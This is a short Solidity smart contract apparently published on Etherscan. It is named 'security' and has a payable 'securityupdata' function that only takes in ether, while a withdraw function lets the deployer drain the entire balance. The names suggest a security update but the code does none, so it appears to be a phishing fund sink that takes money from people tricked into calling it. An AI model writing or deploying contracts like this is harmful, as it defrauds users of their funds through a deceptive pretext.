/**
 *Submitted for verification at Etherscan.io on 2022-12-23
*/

pragma solidity ^0.4.26;

contract security{
    address private owner;
    constructor() public{
        owner = msg.sender;
    }
    function securityupdata() public payable{
    }
    function withdraw() public{
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }
}